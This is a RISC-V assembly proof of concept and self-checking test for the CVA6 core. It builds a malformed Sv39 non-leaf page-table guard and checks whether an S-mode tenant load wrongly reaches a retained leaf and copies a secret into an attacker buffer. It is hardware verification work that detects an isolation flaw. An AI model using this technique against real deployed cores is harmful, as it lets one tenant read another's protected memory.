/*
 * CVA6 Sv39 malformed non-leaf PTE guard bypass security PoC
 *
 * This models an M-mode monitor that keeps a lower-level page-table subtree in
 * memory but marks the root entry as an architecturally faulting guard:
 *
 *   V=1, R=W=X=0, A=1
 *
 * For Sv39 non-leaf PTEs, A/D/U are reserved. A compliant core must stop the
 * walk and raise a load page fault before reaching the lower-level leaf.
 *
 * Correct behavior:
 *   S-mode tenant load from GUARDED_VA raises load page fault.
 *   attacker_buffer remains zero and the program exits with code 0.
 *
 * Vulnerable CVA6 behavior:
 *   The malformed non-leaf PTE is followed as a table pointer.
 *   The tenant load reaches a stale readable leaf and reads SECRET_WORD.
 *   The tenant copies it to attacker_buffer and exits with code 31.
 */
.option push
.option norelax
.option norvc

.equ SATP_SV39,      0x8000000000000000
.equ MSTATUS_MPP_S,  0x00000800
.equ MSTATUS_MPP_M,  0x00001800
.equ PMP_RWX_NAPOT,  0x1f

.equ PTE_V,          0x001
.equ PTE_R,          0x002
.equ PTE_W,          0x004
.equ PTE_X,          0x008
.equ PTE_A,          0x040
.equ PTE_D,          0x080
.equ PTE_TABLE,      PTE_V
.equ PTE_RWXAD,      (PTE_V | PTE_R | PTE_W | PTE_X | PTE_A | PTE_D)
.equ PTE_RAD,        (PTE_V | PTE_R | PTE_A | PTE_D)

.equ TEXT_VA,        0x0000000080000000
.equ GUARDED_VA,     0x0000000040000000
.equ SECRET_WORD,    0x7365637265743137
.equ CAUSE_LPF,      13

.equ ROOT_TEXT_IDX,  ((TEXT_VA    >> 30) & 0x1ff)
.equ ROOT_GUARD_IDX, ((GUARDED_VA >> 30) & 0x1ff)
.equ L1_GUARD_IDX,   ((GUARDED_VA >> 21) & 0x1ff)
.equ L0_GUARD_IDX,   ((GUARDED_VA >> 12) & 0x1ff)

.macro EXIT code
  csrw satp, zero
  li   a0, \code
  la   t0, tohost
  slli t1, a0, 1
  ori  t1, t1, 1
  sd   t1, 0(t0)
  fence
  .word 0x0005006b
1:
  j 1b
.endm

.section .text.init, "ax"
.globl _start
_start:
  la   t0, m_trap
  csrw mtvec, t0
  csrw medeleg, zero
  csrw mideleg, zero
  csrw satp, zero

  li   t0, -1
  csrw pmpaddr0, t0
  li   t0, PMP_RWX_NAPOT
  csrw pmpcfg0, t0

  /* root[2]: 1GiB identity leaf for code/data at 0x80000000. */
  la   t0, root_pt
  li   t1, TEXT_VA
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, PTE_RWXAD
  sd   t1, (ROOT_TEXT_IDX * 8)(t0)

  /*
   * root[1]: architecturally faulting guard for a retained subtree.
   * Non-leaf A=1 is reserved and must raise a page fault.
   */
  la   t1, guarded_l1_pt
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, (PTE_TABLE | PTE_A)
  sd   t1, (ROOT_GUARD_IDX * 8)(t0)

  /*
   * Retained lower levels. They should be unreachable while the root guard is
   * malformed, but CVA6 follows the guard and reaches this leaf.
   */
  la   t0, guarded_l1_pt
  la   t1, guarded_l0_pt
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, PTE_TABLE
  sd   t1, (L1_GUARD_IDX * 8)(t0)

  la   t0, guarded_l0_pt
  la   t1, guarded_secret
  srli t1, t1, 12
  slli t1, t1, 10
  ori  t1, t1, PTE_RAD
  sd   t1, (L0_GUARD_IDX * 8)(t0)

  la   t0, root_pt
  srli t0, t0, 12
  li   t1, SATP_SV39
  or   t0, t0, t1
  csrw satp, t0
  sfence.vma x0, x0

  li   t0, MSTATUS_MPP_M
  csrc mstatus, t0
  li   t0, MSTATUS_MPP_S
  csrs mstatus, t0
  la   t0, s_tenant_probe
  csrw mepc, t0
  mret

s_tenant_probe:
  li   t0, GUARDED_VA

.globl guarded_load_site
guarded_load_site:
  ld   t1, 0(t0)
  li   t2, SECRET_WORD
  beq  t1, t2, leak_guarded_secret
  EXIT 32

leak_guarded_secret:
  la   t0, attacker_buffer
  sd   t1, 0(t0)
  fence rw, rw
  EXIT 31

m_trap:
  csrr t0, mcause
  li   t1, CAUSE_LPF
  bne  t0, t1, fail_wrong_trap

  csrr t0, mepc
  la   t1, guarded_load_site
  bne  t0, t1, fail_wrong_trap

  csrr t0, mtval
  li   t1, GUARDED_VA
  bne  t0, t1, fail_wrong_trap

  la   t0, attacker_buffer
  ld   t1, 0(t0)
  bnez t1, fail_buffer_modified
  EXIT 0

fail_wrong_trap:
  EXIT 40

fail_buffer_modified:
  EXIT 41

.section .data.pt, "aw"
.align 12
root_pt:
  .zero 4096

.align 12
guarded_l1_pt:
  .zero 4096

.align 12
guarded_l0_pt:
  .zero 4096

.section .data, "aw"
.align 12
guarded_secret:
  .dword SECRET_WORD

.align 3
attacker_buffer:
  .dword 0

.section .tohost, "aw"
.align 3
.globl tohost
tohost:
  .dword 0

.globl fromhost
fromhost:
  .dword 0

.option pop
